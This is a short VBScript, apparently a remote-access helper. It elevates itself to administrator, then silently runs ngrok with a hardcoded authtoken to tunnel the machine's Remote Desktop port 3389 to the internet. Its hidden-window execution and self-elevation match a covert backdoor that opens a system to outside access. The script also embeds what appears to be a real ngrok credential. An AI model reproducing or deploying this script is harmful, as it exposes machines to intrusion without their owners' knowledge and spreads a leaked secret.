Dim objShell
Set objShell = WScript.CreateObject("WScript.Shell")

If WScript.Arguments.length = 0 Then
Set ObjShell = CreateObject("Shell.Application")
ObjShell.ShellExecute "wscript.exe", """" & _
WScript.ScriptFullName & """" &_
 " RunAsAdministrator", , "runas", 1
Else

end if

' #------------------------------------------------------------------------
' #-------------------------------Aqui esta  el codigo-----------------------------------------
' #------------------------------------------------------------------------

Set objShell = WScript.CreateObject("WScript.Shell")
command = "ngrok http 80 -log=stdout  > ngrok.log &"

' objShell.run "cmd.exe /C "" ngrok http 80 -log=stdout  > ngrok.log """,0
' objShell.run "cmd.exe /C "" ngrok http 80 -log=stdout  > ngrok.log """,0
objShell.run "cmd.exe /C "" ngrok  authtoken 1SUMV0bQWCU8lTXuKvpyF6eIEyO_4g3xTatHJ122Xk4BETrSa && ngrok tcp  3389 -log=stdout  > ngrok.log """,0
' objShell.Run command,0
Set objShell = Nothing
